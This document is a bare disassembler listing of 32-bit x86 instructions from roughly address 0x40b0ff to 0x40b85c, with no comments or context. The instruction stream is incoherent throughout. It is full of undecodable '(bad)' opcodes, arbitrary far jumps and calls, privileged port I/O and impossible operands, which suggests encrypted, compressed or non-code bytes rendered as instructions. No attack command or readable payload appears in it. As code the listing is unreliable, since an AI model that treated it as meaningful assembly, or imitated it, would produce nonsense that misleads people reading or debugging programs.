  40b0ff:	or     dl,BYTE PTR [edi-0x80]
  40b102:	scas   al,BYTE PTR es:[edi]
  40b103:	leave  
  40b104:	xchg   edx,eax
  40b105:	test   DWORD PTR [edi+edi*2-0x2e5ed19f],0x8a67f6b7
  40b110:	sbb    BYTE PTR [eax-0x12],dl
  40b113:	add    edi,DWORD PTR [ecx]
  40b115:	xor    DWORD PTR [ebp-0x3d],esi
  40b118:	cli    
  40b119:	push   ecx
  40b11a:	out    dx,al
  40b11b:	out    dx,al
  40b11c:	or     ch,al
  40b11e:	or     BYTE PTR [eax-0x22],bh
  40b121:	jmp    0x4229f734
  40b126:	scas   al,BYTE PTR es:[edi]
  40b127:	or     edi,DWORD PTR [edx]
  40b129:	xchg   edx,eax
  40b12a:	scas   al,BYTE PTR es:[edi]
  40b12b:	bound  ecx,QWORD PTR [edx]
  40b12d:	jecxz  0x40b121
  40b12f:	pop    ss
  40b130:	fwait
  40b131:	pop    edx
  40b132:	add    bh,dh
  40b134:	cmp    al,0x69
  40b136:	xchg   ebx,edx
  40b138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b139:	fbstp  TBYTE PTR [ebp-0x60]
  40b13c:	xchg   ebx,eax
  40b13d:	(bad)  
  40b13e:	mov    edi,0xcb5d1d1c
  40b143:	jmp    0x58fc:0x3a4adf5e
  40b14a:	rcl    DWORD PTR [esi],0xd4
  40b14d:	and    bl,al
  40b14f:	stos   DWORD PTR es:[edi],eax
  40b150:	sbb    dl,BYTE PTR [edx-0x1cc57621]
  40b156:	push   edx
  40b157:	mov    esi,0xa46ca1b6
  40b15c:	dec    esp
  40b15d:	aad    0x4d
  40b15f:	(bad)
  40b162:	dec    ebx
  40b163:	jg     0x40b1a9
  40b165:	stc    
  40b166:	xor    DWORD PTR [si-0x5573],eax
  40b16b:	jmp    0x40b1a2
  40b16d:	mov    esi,0xb8469c25
  40b172:	jns    0x40b0fe
  40b174:	aad    0x2
  40b176:	test   esp,edx
  40b178:	popf   
  40b179:	outs   dx,DWORD PTR ds:[esi]
  40b17a:	es cdq 
  40b17c:	or     DWORD PTR [ebx+0x48364b6d],ebp
  40b182:	sahf   
  40b183:	xchg   ebp,edi
  40b185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b186:	xchg   ebp,eax
  40b187:	and    al,BYTE PTR [ecx-0x2f9819ce]
  40b18d:	cwde   
  40b18e:	push   eax
  40b18f:	mov    ebx,0x73ec18ee
  40b194:	jecxz  0x40b12e
  40b196:	pop    eax
  40b197:	sbb    eax,0xf0729520
  40b19c:	cdq    
  40b19d:	mov    edi,0xd4785e61
  40b1a2:	call   0x1a6:0x273bcd99
  40b1a9:	(bad)  
  40b1ab:	mov    eax,0x15389e8c
  40b1b0:	lock xor DWORD PTR [edx],edi
  40b1b3:	push   ds
  40b1b4:	es jmp 0xdfa2:0xf9f20152
  40b1bc:	cli    
  40b1bd:	out    dx,eax
  40b1be:	(bad)  
  40b1bf:	sub    edi,esi
  40b1c1:	inc    esi
  40b1c2:	imul   edx,DWORD PTR [eax],0xa365b5a1
  40b1c8:	push   eax
  40b1c9:	out    dx,eax
  40b1ca:	(bad)  
  40b1cb:	add    ah,bl
  40b1cd:	icebp  
  40b1ce:	add    BYTE PTR [edi+0x85e038],ah
  40b1d4:	xchg   edi,eax
  40b1d5:	sti    
  40b1d6:	adc    BYTE PTR [eax+0x2d],al
  40b1d9:	outs   dx,DWORD PTR ds:[esi]
  40b1da:	pop    edi
  40b1db:	stos   BYTE PTR es:[edi],al
  40b1dc:	stos   BYTE PTR es:[edi],al
  40b1dd:	outs   dx,BYTE PTR ds:[esi]
  40b1de:	(bad)  
  40b1df:	or     BYTE PTR ds:0xbdfc84be,cl
  40b1e5:	mov    al,ds:0xa2adcdfc
  40b1ea:	jmp    0x73294d36
  40b1ef:	pop    DWORD PTR [edi+0x97a01d7]
  40b1f5:	dec    ebp
  40b1f6:	xor    BYTE PTR gs:[ebp-0x14],ch
  40b1fa:	lock adc edi,esp
  40b1fd:	mov    ds:0xe8b3796c,eax
  40b202:	push   edi
  40b203:	cmp    edx,ebx
  40b205:	xchg   ebx,eax
  40b206:	pusha  
  40b207:	loop   0x40b27e
  40b209:	pop    ebx
  40b20a:	js     0x40b27b
  40b20c:	pop    ss
  40b20d:	gs and eax,0xa7927ab2
  40b213:	mov    ecx,DWORD PTR [edi]
  40b215:	xchg   edi,eax
  40b216:	lods   al,BYTE PTR ds:[esi]
  40b217:	repnz test eax,0x46d62b1e
  40b21d:	fdiv   QWORD PTR [esi]
  40b21f:	dec    ebp
  40b220:	shr    DWORD PTR [ebp-0x48ec41e3],1
  40b226:	iret   
  40b227:	int    0xd7
  40b229:	sbb    eax,0x4ee3bb52
  40b22e:	jo     0x40b1e7
  40b230:	or     al,BYTE PTR [ebx]
  40b232:	push   ecx
  40b233:	lahf   
  40b234:	shr    BYTE PTR [edx-0x1e],cl
  40b237:	mov    ds:0xbf05def7,al
  40b23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b23d:	jecxz  0x40b1d6
  40b23f:	mov    ah,0xce
  40b241:	out    0xd6,al
  40b243:	adc    ch,BYTE PTR [edi]
  40b245:	mov    esp,edx
  40b247:	xchg   esi,eax
  40b248:	cmp    eax,0x28c89e9f
  40b24d:	mov    ebx,0xad9322bd
  40b252:	adc    eax,0xcb8ccaba
  40b257:	sbb    ecx,DWORD PTR [ebx]
  40b259:	mov    BYTE PTR ss:[edi-0x65],al
  40b25d:	adc    al,0x1f
  40b25f:	idiv   BYTE PTR [ecx+0x1426a915]
  40b265:	in     eax,0xb6
  40b267:	mov    esp,0x8976c170
  40b26c:	int    0xac
  40b26e:	ret    
  40b26f:	rcl    ebx,cl
  40b271:	inc    esi
  40b272:	ins    BYTE PTR es:[edi],dx
  40b273:	adc    BYTE PTR [ecx-0x5be58c9d],0x8c
  40b27a:	jp     0x40b268
  40b27c:	dec    ebx
  40b27d:	test   BYTE PTR [ebx-0x58],al
  40b280:	inc    ebp
  40b281:	push   eax
  40b282:	xchg   ecx,eax
  40b283:	push   esp
  40b284:	mov    esi,0x91eec499
  40b289:	rcr    bl,1
  40b28b:	pop    ss
  40b28c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28d:	daa    
  40b28e:	and    DWORD PTR [ecx-0x6549c25d],esi
  40b294:	call   0xa472:0xcefcaf41
  40b29b:	mov    eax,ds:0xdfd9e605
  40b2a0:	xchg   ebp,eax
  40b2a1:	pop    ss
  40b2a2:	js     0x40b26f
  40b2a4:	cld    
  40b2a5:	call   0xef11403c
  40b2aa:	imul   esi,DWORD PTR [ebx],0xffffffde
  40b2ad:	sub    DWORD PTR [ecx+0x3e],esi
  40b2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b1:	push   eax
  40b2b2:	adc    esi,DWORD PTR [edi+ebx*2]
  40b2b5:	loope  0x40b26c
  40b2b7:	aam    0xc0
  40b2b9:	mov    ebx,0xf11e5291
  40b2be:	mov    ds,WORD PTR [edi+0x171790d]
  40b2c4:	adc    al,BYTE PTR [edi-0x3c]
  40b2c7:	das    
  40b2c8:	add    BYTE PTR [ebp+0x75],0x3a
  40b2cc:	ins    BYTE PTR es:[edi],dx
  40b2cd:	add    al,0xd4
  40b2cf:	scas   eax,DWORD PTR es:[edi]
  40b2d0:	fild   QWORD PTR [ecx]
  40b2d2:	mov    ds:0xcaf18dda,eax
  40b2d7:	dec    esi
  40b2d8:	hlt    
  40b2d9:	or     BYTE PTR [ebx-0x3660b9de],al
  40b2df:	xor    BYTE PTR [ecx],0xba
  40b2e2:	sub    DWORD PTR [ebx-0x46],ecx
  40b2e5:	fs mov ?,ecx
  40b2e8:	in     eax,dx
  40b2e9:	xchg   ebx,eax
  40b2ea:	stc    
  40b2eb:	xor    al,dh
  40b2ed:	(bad)  
  40b2ee:	adc    DWORD PTR [ecx],esi
  40b2f0:	aam    0x4b
  40b2f2:	vandps xmm5,xmm3,XMMWORD PTR [eax-0x64]
  40b2f7:	push   ss
  40b2f8:	ret    
  40b2f9:	clc    
  40b2fa:	enter  0xbd1,0xd3
  40b2fe:	or     ebx,edx
  40b300:	sub    ah,bh
  40b302:	outs   dx,DWORD PTR ds:[esi]
  40b303:	jae    0x40b310
  40b305:	cwde   
  40b306:	or     al,BYTE PTR [edi+eiz*2-0x5972bc14]
  40b30d:	jg     0x40b38c
  40b30f:	fs cmc 
  40b311:	test   eax,0xb2bf553e
  40b316:	adc    ecx,edx
  40b318:	dec    ebp
  40b319:	jbe    0x40b361
  40b31b:	cdq    
  40b31c:	push   edi
  40b31d:	push   esi
  40b31e:	or     esi,esp
  40b320:	ja     0x40b36f
  40b322:	test   al,cl
  40b324:	lods   eax,DWORD PTR ds:[esi]
  40b325:	and    BYTE PTR [ecx+0x55],ah
  40b328:	pusha  
  40b329:	bound  eax,QWORD PTR [edi+0x65]
  40b32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b32d:	jmp    0x95e02803
  40b332:	add    al,0x49
  40b334:	cld    
  40b335:	dec    ebx
  40b336:	adc    BYTE PTR [edi+0x2d],0xbd
  40b33a:	(bad)  
  40b33b:	mov    eax,0x50f5d59e
  40b340:	scas   al,BYTE PTR es:[edi]
  40b341:	les    eax,FWORD PTR ds:0x8ae77b43
  40b347:	xor    ch,BYTE PTR [ecx+0x16e2b304]
  40b34d:	test   esi,eax
  40b34f:	mov    ds:0x461f62cc,al
  40b354:	push   ds
  40b355:	dec    ebp
  40b356:	or     eax,0x77167623
  40b35b:	xchg   esp,eax
  40b35c:	dec    ebx
  40b35d:	(bad)  
  40b35e:	aam    0x83
  40b360:	add    BYTE PTR [ecx-0x611afa1f],ah
  40b366:	out    0xb9,eax
  40b368:	or     bl,bl
  40b36a:	pop    esi
  40b36b:	push   eax
  40b36c:	dec    edi
  40b36d:	mov    ecx,0xfb98e00c
  40b372:	sub    eax,0xc16f2353
  40b377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b378:	jne    0x40b3c8
  40b37a:	mov    ss:0xad5bb324,al
  40b380:	cmp    edx,DWORD PTR [edx+0x5e]
  40b383:	test   BYTE PTR [edi+ebx*1+0x21ad317a],ah
  40b38a:	mov    edx,0xbfec662d
  40b38f:	push   ebp
  40b390:	aaa    
  40b391:	mov    al,0x46
  40b393:	out    dx,al
  40b394:	xlat   BYTE PTR ds:[ebx]
  40b395:	aad    0x82
  40b397:	pop    ds
  40b398:	in     al,0x6
  40b39a:	ficom  WORD PTR [ecx]
  40b39c:	scas   eax,DWORD PTR es:[edi]
  40b39d:	call   0x77ae6aaa
  40b3a2:	retf   0xa0ca
  40b3a5:	or     eax,DWORD PTR [ebx]
  40b3a7:	push   ss
  40b3a8:	clc    
  40b3a9:	sbb    al,0x5e
  40b3ab:	cmp    BYTE PTR [ebx],ch
  40b3ad:	stos   BYTE PTR es:[edi],al
  40b3ae:	sbb    DWORD PTR [edi+0x44],ebx
  40b3b1:	or     al,0x56
  40b3b3:	sbb    dl,bl
  40b3b5:	ss int3 
  40b3b7:	std    
  40b3b8:	pop    ds
  40b3b9:	repz sbb al,0x34
  40b3bc:	mov    bl,0xc7
  40b3be:	ins    DWORD PTR es:[edi],dx
  40b3bf:	inc    ebx
  40b3c0:	cmc    
  40b3c1:	out    dx,eax
  40b3c2:	xchg   bh,cl
  40b3c4:	inc    ebp
  40b3c5:	mov    ch,0xb9
  40b3c7:	out    0x38,al
  40b3c9:	mov    eax,ds:0x40901e0a
  40b3ce:	in     al,dx
  40b3cf:	mov    cl,dh
  40b3d1:	add    bh,dh
  40b3d3:	arpl   WORD PTR [edi+0x32],dx
  40b3d6:	mov    ch,0xd9
  40b3d8:	fs call 0x9d63:0x37787d72
  40b3e0:	int3   
  40b3e1:	outs   dx,DWORD PTR ds:[esi]
  40b3e2:	bnd jle 0x40b40c
  40b3e5:	jae    0x40b466
  40b3e7:	mov    bl,0x22
  40b3e9:	je     0x40b386
  40b3eb:	or     eax,0xb85c12ba
  40b3f0:	in     al,dx
  40b3f1:	out    dx,al
  40b3f2:	outs   dx,BYTE PTR ds:[esi]
  40b3f3:	fucomp st(0)
  40b3f5:	and    bh,dl
  40b3f7:	sti    
  40b3f8:	bound  ecx,QWORD PTR [ebx+0x3ec2fb4c]
  40b3fe:	adc    al,0x8b
  40b400:	lods   al,BYTE PTR ds:[esi]
  40b401:	(bad)  [ecx-0x51]
  40b404:	pop    edi
  40b405:	jo     0x40b394
  40b407:	mov    bh,0xba
  40b409:	xchg   BYTE PTR [edx-0x757d745a],cl
  40b40f:	mov    WORD PTR [edi-0x4813b610],ss
  40b415:	xor    DWORD PTR [edx+esi*1+0x4fb226d9],0xffffffbb
  40b41d:	test   al,0x36
  40b41f:	xchg   ebp,eax
  40b420:	pop    eax
  40b421:	xchg   BYTE PTR [edx+0x2f],ah
  40b424:	fisttp DWORD PTR [ecx+edx*2]
  40b427:	sub    BYTE PTR [ecx+0x11],cl
  40b42a:	(bad)  
  40b42b:	dec    ebx
  40b42c:	xchg   esi,eax
  40b42d:	rcl    BYTE PTR [ebp+0x1d554dd7],1
  40b433:	cli    
  40b434:	into   
  40b435:	ja     0x40b48b
  40b437:	or     BYTE PTR cs:0xb2c3bcb6,dl
  40b43e:	(bad)  
  40b43f:	xchg   edx,eax
  40b440:	repz xor esi,DWORD PTR fs:[edx]
  40b444:	test   BYTE PTR [ebp+0x74],bh
  40b447:	sbb    edx,DWORD PTR [eax+0x67]
  40b44a:	xchg   edx,eax
  40b44b:	bound  esi,QWORD PTR [esp+ecx*1+0x26]
  40b44f:	aad    0xd8
  40b451:	push   0xaef7aa7e
  40b456:	mov    dl,0xde
  40b458:	mov    ebx,0x9af9967c
  40b45d:	gs pop ss
  40b45f:	(bad)  
  40b460:	sahf   
  40b461:	and    eax,DWORD PTR [ecx-0x2]
  40b464:	call   DWORD PTR [ecx+0x14]
  40b467:	les    edx,FWORD PTR [ecx]
  40b469:	and    eax,0x496c956d
  40b46e:	pop    esi
  40b46f:	in     al,0x3
  40b471:	xor    esi,DWORD PTR [esi-0x45]
  40b474:	jae    0x40b44c
  40b476:	push   ebp
  40b477:	sub    eax,0x15652ae4
  40b47c:	push   esp
  40b47d:	call   0x2d3a:0x864741ad
  40b484:	call   0x565c:0xc9431ddc
  40b48b:	adc    BYTE PTR [ecx],dl
  40b48d:	and    bl,bl
  40b48f:	cmp    dl,BYTE PTR [edi+0x11b3d6a1]
  40b495:	lds    esp,FWORD PTR [edi]
  40b497:	inc    edi
  40b498:	bound  edi,QWORD PTR [ebx+0x13]
  40b49b:	out    0x85,eax
  40b49d:	adc    al,0xbf
  40b49f:	out    0x8a,eax
  40b4a1:	es mov edx,0x9b26e7e4
  40b4a7:	out    0xbb,eax
  40b4a9:	mov    ebp,DWORD PTR [ecx]
  40b4ab:	cmp    eax,0x11390952
  40b4b0:	xchg   ebp,eax
  40b4b1:	adc    eax,DWORD PTR [ecx+0x46]
  40b4b4:	add    al,0x95
  40b4b6:	push   0xffffffc2
  40b4b8:	jne    0x40b46a
  40b4ba:	ins    DWORD PTR es:[edi],dx
  40b4bb:	xchg   esp,eax
  40b4bc:	add    eax,0x410bfb33
  40b4c1:	or     DWORD PTR [edx],0xffffff8d
  40b4c4:	sbb    bl,BYTE PTR [edi+0x34]
  40b4c7:	dec    ebp
  40b4c8:	shr    ah,cl
  40b4ca:	pop    esp
  40b4cb:	add    BYTE PTR [edi-0x1c],dl
  40b4ce:	scas   al,BYTE PTR es:[edi]
  40b4cf:	cld    
  40b4d0:	inc    ecx
  40b4d2:	or     BYTE PTR [ecx-0x7b],ch
  40b4d5:	or     esi,DWORD PTR [ebp-0x39]
  40b4d8:	inc    ecx
  40b4d9:	dec    esi
  40b4da:	leave  
  40b4db:	imul   ecx,DWORD PTR [edx-0x59f71936],0xffffffae
  40b4e2:	scas   al,BYTE PTR es:[edi]
  40b4e3:	scas   eax,DWORD PTR es:[edi]
  40b4e4:	out    0x4c,eax
  40b4e6:	es dec ebx
  40b4e8:	lds    ecx,FWORD PTR [eax-0x6336f730]
  40b4ee:	add    eax,0xd277d6fb
  40b4f3:	xchg   ch,ch
  40b4f5:	add    DWORD PTR [ecx],eax
  40b4f7:	dec    esi
  40b4f8:	aas    
  40b4f9:	mov    ?,WORD PTR [edi+0x533f0557]
  40b4ff:	cs adc al,0xe0
  40b502:	std    
  40b503:	out    0x70,al
  40b505:	push   ds
  40b506:	neg    BYTE PTR [ecx+ecx*8+0x4934e318]
  40b50d:	retf   0x9e6e
  40b510:	sub    al,0x92
  40b512:	sar    DWORD PTR [edi+0x1],0x89
  40b516:	(bad)  
  40b517:	fistp  QWORD PTR [edx]
  40b519:	push   esp
  40b51a:	shr    ah,1
  40b51c:	arpl   WORD PTR [esi],bp
  40b51e:	jge    0x40b556
  40b520:	div    DWORD PTR [ecx+0x69]
  40b523:	aaa    
  40b524:	outs   dx,BYTE PTR ds:[esi]
  40b525:	rcl    BYTE PTR [edi+edx*2],0xb7
  40b529:	(bad)
  40b52c:	mov    es,WORD PTR [edx+0x4d810c9a]
  40b532:	ror    DWORD PTR [esi],cl
  40b534:	xor    DWORD PTR [eax],esi
  40b536:	sahf   
  40b537:	mov    al,0x1
  40b539:	aaa    
  40b53a:	test   al,0x77
  40b53c:	retf   0x794b
  40b53f:	retf   0xddc4
  40b542:	aad    0x29
  40b544:	test   BYTE PTR [edi-0x7797c887],bh
  40b54a:	dec    ecx
  40b54b:	inc    ebp
  40b54c:	mov    eax,ds:0x478a326a
  40b551:	push   ds
  40b552:	inc    esi
  40b553:	dec    ecx
  40b554:	xor    al,0x80
  40b556:	xchg   ebp,eax
  40b557:	dec    edx
  40b558:	add    edi,eax
  40b55a:	push   cs
  40b55b:	jl     0x40b570
  40b55d:	enter  0xca4a,0x2
  40b561:	clc    
  40b562:	and    al,0x85
  40b564:	adc    al,0x51
  40b566:	dec    ebp
  40b567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b568:	ins    BYTE PTR es:[edi],dx
  40b569:	popa   
  40b56a:	fisub  WORD PTR [eax-0x2203c008]
  40b570:	les    esi,FWORD PTR [eax+0x30]
  40b573:	scas   al,BYTE PTR es:[edi]
  40b574:	outs   dx,DWORD PTR ds:[esi]
  40b575:	xor    esi,DWORD PTR [esi-0x39]
  40b578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b579:	dec    esp
  40b57a:	push   0xe5d265fc
  40b57f:	out    dx,eax
  40b580:	inc    edi
  40b581:	shr    DWORD PTR [esp+ebp*4+0x7fce55f6],0x1
  40b589:	out    0xb8,al
  40b58b:	mov    BYTE PTR [edx+0x31],bh
  40b58e:	iret   
  40b58f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b591:	mov    ds:0x567e0042,al
  40b596:	mov    esi,0xd445767e
  40b59b:	jmp    0xdecd0d3f
  40b5a0:	call   0x5d8d5774
  40b5a5:	imul   edi,edx,0xffffffe1
  40b5a8:	mov    ds,WORD PTR [edx-0x52]
  40b5ab:	and    al,0xbf
  40b5ad:	and    eax,0x687813c
  40b5b2:	sbb    eax,0x792eb4c8
  40b5b7:	mov    ebp,0x5eced171
  40b5bc:	sbb    al,0xcf
  40b5be:	sub    ebp,edi
  40b5c0:	jo     0x40b597
  40b5c2:	jecxz  0x40b613
  40b5c4:	gs adc al,0x5c
  40b5c7:	inc    eax
  40b5c8:	xchg   BYTE PTR [eax],dh
  40b5ca:	fisub  WORD PTR [edi+0x42]
  40b5cd:	iret   
  40b5ce:	mov    edi,0x581fd5a3
  40b5d3:	xchg   DWORD PTR [edx],esp
  40b5d5:	mov    cl,0x8b
  40b5d7:	inc    edx
  40b5d8:	mov    cl,0x48
  40b5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5db:	inc    edx
  40b5dc:	pop    esi
  40b5dd:	(bad)  
  40b5de:	clc    
  40b5df:	mov    ebp,0x9207ba58
  40b5e4:	inc    ebp
  40b5e5:	push   0x6126c91e
  40b5ea:	adc    eax,0x3ff03d6d
  40b5ef:	sbb    al,0xb8
  40b5f1:	adc    BYTE PTR [edx],0x96
  40b5f4:	lock ror eax,1
  40b5f7:	and    ah,0x94
  40b5fa:	mov    DWORD PTR [esi*2-0x3a270737],esp
  40b601:	mov    eax,ds:0xbe4cd164
  40b606:	std    
  40b607:	mov    esi,0xe369e74b
  40b60c:	jns    0x40b65b
  40b60e:	sti    
  40b60f:	fadd   QWORD PTR [ebp-0x3d]
  40b612:	mov    esp,0x77208144
  40b617:	cmp    BYTE PTR [eiz*1+0x1fe02467],0x73
  40b61f:	xor    ch,BYTE PTR [esi+0x5d5a01a2]
  40b625:	xchg   ebp,eax
  40b626:	xchg   ebx,eax
  40b627:	ret    
  40b628:	xor    BYTE PTR [ecx-0x71],0x4b
  40b62c:	jecxz  0x40b5d2
  40b62e:	(bad)  
  40b62f:	sub    al,0x28
  40b631:	jmp    0x9202:0x55438df4
  40b638:	jmp    0x7df8:0x7d41de6a
  40b63f:	add    eax,0x619436a0
  40b644:	jg     0x40b5d9
  40b646:	mov    ah,0xc3
  40b648:	call   0xce0bbc38
  40b64d:	js     0x40b683
  40b64f:	jne    0x40b6c6
  40b651:	(bad)  
  40b652:	out    dx,al
  40b653:	add    cl,BYTE PTR [ecx-0x40c07a98]
  40b659:	and    al,0x7a
  40b65b:	(bad)  
  40b65c:	arpl   dx,sp
  40b65e:	popa   
  40b65f:	mov    bl,BYTE PTR [ecx+0x1b]
  40b662:	mov    eax,ds:0x1e5ff55e
  40b667:	(bad)  
  40b669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b66a:	ret    
  40b66b:	jl     0x40b5ef
  40b66d:	mov    ebp,0xa31112a3
  40b672:	rcr    eax,cl
  40b674:	add    BYTE PTR [ebp-0x5e],ah
  40b677:	ds dec esp
  40b679:	sbb    eax,0xd38f44e5
  40b67e:	adc    eax,0x4db16eb6
  40b683:	gs (bad) 
  40b685:	xlat   BYTE PTR ds:[ebx]
  40b686:	test   eax,0xc4f0f502
  40b68b:	sar    BYTE PTR [ebp+0xd],cl
  40b68e:	sahf   
  40b68f:	int3   
  40b690:	outs   dx,BYTE PTR ds:[esi]
  40b691:	add    dh,BYTE PTR [ebx]
  40b693:	nop
  40b694:	and    DWORD PTR [ecx-0xc0e4207],0x5f91f59f
  40b69e:	cmc    
  40b69f:	shr    DWORD PTR [ebp-0x3],1
  40b6a2:	les    eax,FWORD PTR [edx]
  40b6a4:	pop    eax
  40b6a5:	cmp    ch,BYTE PTR [ebp-0x73]
  40b6a8:	jmp    0xef9c:0xeef86df7
  40b6af:	bound  edx,QWORD PTR [edx+0x3]
  40b6b2:	scas   eax,DWORD PTR es:[edi]
  40b6b3:	je     0x40b710
  40b6b5:	in     al,0x86
  40b6b7:	jmp    0xc991:0xfe1455a4
  40b6be:	xchg   ecx,eax
  40b6bf:	imul   eax,DWORD PTR [ecx-0x42dfa4ff],0x199240ab
  40b6c9:	add    ebx,edx
  40b6cb:	cld    
  40b6cc:	in     al,0xf7
  40b6ce:	stos   BYTE PTR es:[edi],al
  40b6cf:	push   eax
  40b6d0:	cmp    BYTE PTR [esi],al
  40b6d2:	pop    es
  40b6d3:	sbb    eax,0x5d4839e6
  40b6d8:	or     ebp,eax
  40b6da:	loope  0x40b65e
  40b6dc:	and    al,BYTE PTR [edx+0x75f07511]
  40b6e2:	or     al,0x81
  40b6e4:	push   esp
  40b6e5:	add    eax,0xd5042751
  40b6ea:	es push edi
  40b6ec:	pusha  
  40b6ed:	retf   0xed74
  40b6f0:	adc    edx,edx
  40b6f2:	daa    
  40b6f3:	push   ss
  40b6f4:	cdq    
  40b6f5:	xor    DWORD PTR [eax-0x4babaddc],0x73
  40b6fc:	and    esi,DWORD PTR [ecx-0x3c3ce03a]
  40b702:	or     al,al
  40b704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b705:	sbb    DWORD PTR [edi-0x5b364f55],esp
  40b70b:	js     0x40b70b
  40b70d:	jne    0x40b710
  40b70f:	mov    ds:0xf0ad48c2,eax
  40b714:	pop    edi
  40b715:	pop    ecx
  40b716:	mov    esp,0x6475a699
  40b71b:	(bad)  
  40b71c:	and    DWORD PTR [edi-0x33],ebp
  40b71f:	and    al,0xb2
  40b721:	sbb    DWORD PTR [ecx+0x69],esp
  40b724:	outs   dx,DWORD PTR ds:[esi]
  40b725:	or     DWORD PTR [esi+0x67],ebx
  40b728:	push   0xbb00b612
  40b72d:	adc    al,BYTE PTR [eax-0x49731d31]
  40b733:	ins    DWORD PTR es:[edi],dx
  40b734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b735:	sbb    DWORD PTR [edx-0x35],esi
  40b738:	mov    ah,0x80
  40b73a:	xchg   eax,ebx
  40b73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b73d:	bound  eax,QWORD PTR [edx+ebp*1+0x58]
  40b741:	inc    ebp
  40b742:	rol    bh,0x12
  40b745:	shl    DWORD PTR [edx],0xe5
  40b748:	pop    ss
  40b749:	or     bh,BYTE PTR [eax]
  40b74b:	mov    ecx,DWORD PTR [ecx-0x44]
  40b74e:	scas   eax,DWORD PTR es:[edi]
  40b74f:	sub    ch,BYTE PTR [ebx+0xe]
  40b752:	outs   dx,BYTE PTR ds:[esi]
  40b753:	adc    eax,0x53d2468
  40b758:	icebp  
  40b759:	or     eax,0x87c20482
  40b75e:	xor    edx,DWORD PTR [eax+0x63f0fbb]
  40b764:	shr    BYTE PTR [edi-0x4eb5a84],0x52
  40b76b:	leave  
  40b76c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76d:	test   BYTE PTR [eax+0x35],cl
  40b770:	lea    eax,[ebx]
  40b772:	popf   
  40b773:	push   0xffffffca
  40b775:	neg    DWORD PTR [edi-0x37]
  40b778:	push   es
  40b779:	xor    ebx,DWORD PTR [eax-0x3e]
  40b77c:	jno    0x40b7af
  40b77e:	ror    BYTE PTR [edi],cl
  40b780:	xchg   BYTE PTR [ebx],cl
  40b782:	icebp  
  40b783:	mov    esi,es
  40b785:	fucomip st,st(0)
  40b787:	inc    ebp
  40b788:	or     al,0xdc
  40b78a:	adc    DWORD PTR [ecx],esp
  40b78c:	fstp   QWORD PTR [ebx+0x7e]
  40b78f:	pop    eax
  40b790:	adc    DWORD PTR [esi],esp
  40b792:	xchg   bl,dl
  40b794:	adc    edi,ebp
  40b796:	aas    
  40b797:	inc    ecx
  40b798:	fldl2e 
  40b79a:	xor    BYTE PTR [ebx-0x2e6e9072],al
  40b7a0:	ins    DWORD PTR es:[edi],dx
  40b7a1:	lea    edi,[ebx]
  40b7a3:	dec    ebp
  40b7a4:	arpl   WORD PTR ds:0x21ade78,si
  40b7aa:	and    eax,0x8fafbc88
  40b7af:	cdq    
  40b7b0:	loope  0x40b778
  40b7b2:	sbb    DWORD PTR [ebp-0x4a225c31],0xbbc67b74
  40b7bc:	and    al,0xae
  40b7be:	out    0xe2,eax
  40b7c0:	cmp    eax,0xc9a6960c
  40b7c5:	adc    ebp,DWORD PTR [ebp+0x5a]
  40b7c8:	cmp    dl,bh
  40b7ca:	icebp  
  40b7cb:	stos   DWORD PTR es:[edi],eax
  40b7cc:	sti    
  40b7cd:	push   edx
  40b7ce:	call   0x1a27:0x9aaf4ac9
  40b7d5:	dec    edi
  40b7d6:	jg     0x40b813
  40b7d8:	dec    ebx
  40b7d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7da:	jno    0x40b832
  40b7dc:	sub    BYTE PTR [edx+0x16363368],dl
  40b7e2:	outs   dx,DWORD PTR ds:[esi]
  40b7e3:	mov    ebp,0xe091b0ab
  40b7e8:	popa   
  40b7e9:	push   ebx
  40b7ea:	retf   
  40b7eb:	std    
  40b7ec:	sti    
  40b7ed:	lock jns 0x40b7a7
  40b7f0:	in     eax,0x56
  40b7f2:	lods   eax,DWORD PTR ds:[esi]
  40b7f3:	stos   BYTE PTR es:[edi],al
  40b7f4:	mov    eax,DWORD PTR [esi-0x64]
  40b7f7:	xchg   edi,eax
  40b7f8:	cmp    DWORD PTR fs:[esi-0x4e],esp
  40b7fc:	or     al,0xda
  40b7fe:	out    0x4b,al
  40b800:	ins    BYTE PTR es:[edi],dx
  40b801:	mov    ecx,0x2f68b694
  40b806:	jnp    0x40b7c6
  40b808:	adc    DWORD PTR [ebp-0x5c941277],esp
  40b80e:	push   cs
  40b80f:	ins    DWORD PTR es:[edi],dx
  40b810:	inc    bh
  40b812:	xlat   BYTE PTR ds:[ebx]
  40b813:	push   ds
  40b814:	and    al,0x45
  40b816:	mov    cl,0x10
  40b818:	mov    cl,0xa5
  40b81a:	and    BYTE PTR [edx+0x5f91f178],0x78
  40b821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b822:	test   BYTE PTR [ecx],0xa5
  40b825:	xchg   DWORD PTR [eax],ebp
  40b827:	mov    eax,0x54f8b70f
  40b82c:	in     al,0xd
  40b82e:	push   ebp
  40b82f:	sbb    bl,ch
  40b831:	in     eax,0xa0
  40b833:	pop    edx
  40b834:	test   al,0x3b
  40b836:	popf   
  40b837:	ret    
  40b838:	test   bl,0xd6
  40b83b:	call   0x47d2:0x66dcff16
  40b842:	mov    ecx,0xe8ee2da
  40b847:	sbb    BYTE PTR [edx+0x1d],ah
  40b84a:	ret    0x59fb
  40b84d:	push   ebx
  40b84e:	cmp    al,BYTE PTR [ebp+edi*8+0x467bb239]
  40b855:	(bad)  
  40b856:	repnz add eax,0x4dae31bf
  40b85c:	enter  0x342b,0x46
